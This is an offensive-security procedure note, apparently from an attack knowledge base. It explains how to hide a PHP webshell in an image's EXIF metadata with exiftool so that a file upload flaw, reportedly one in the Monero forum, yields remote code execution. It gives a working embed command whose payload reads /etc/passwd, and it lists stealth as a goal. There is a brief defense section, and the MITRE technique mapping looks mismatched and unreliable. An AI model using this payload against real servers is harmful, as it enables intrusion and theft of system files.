---
id: proc-prepare-php-image
tags:
  - rce
  - file-upload
  - php-shell
type: procedure
tools:
  - '[[tools/exiftool]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/exiftool-embed-php]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.421Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
  - '[[Remote File Copy]]'
---
# Prepare-Malicious-Image-with-PHP-Shell

## Summary

This procedure embeds PHP shell code into an image file's EXIF metadata using exiftool, creating a malicious file that executes as a webshell when uploaded and accessed with a .php extension on a vulnerable PHP server.

## Description

In the context of exploiting file upload vulnerabilities like the one in Monero forum's UsersController, this prepares a PNG or JPG image by inserting PHP code into the 'documentname' metadata tag. The server processes the file as an image but executes the PHP if renamed to .php, leading to RCE. Prerequisites include exiftool installed and a base image file.

## Requirements

1. exiftool installed on a Linux/macOS system
2. A valid PNG or JPG image file (e.g., picture.png)
3. Knowledge of PHP payloads for desired actions (e.g., file reading or command execution)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all uploaded file contents, not just extensions (e.g., use libraries to strip metadata)
- Restrict upload extensions to safe types and scan for executable code in metadata
- Monitor for anomalous file uploads and access patterns to /uploads directories

## Objectives

1. Create a dual-purpose file that appears as an image but contains executable PHP
2. Enable RCE upon server-side execution
3. Maintain stealth by preserving image validity

## Instructions

### Step 1: Install and Verify exiftool

**Context**: Ensure the tool is available for metadata manipulation.

**Command** ([[commands/exiftool-verify]]):
```bash
exiftool -ver
```

> This checks the exiftool version; expected output is the version number, confirming installation.

### Step 2: Embed PHP Payload

**Context**: Insert the PHP code into the image's documentname metadata tag to create the shell.

**Command** ([[commands/exiftool-embed-php]]):
```bash
exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
```

> This modifies the image by setting the documentname tag to the PHP payload, which reads /etc/passwd. Expected output: "1 image files updated". Verify with `exiftool -DocumentName picture.png` to see the payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/exiftool-embed-php]]
- [[commands/exiftool-verify]]

## Tools Used

- [[tools/exiftool]]

## Tags

- rce
- php-shell
- metadata-injection
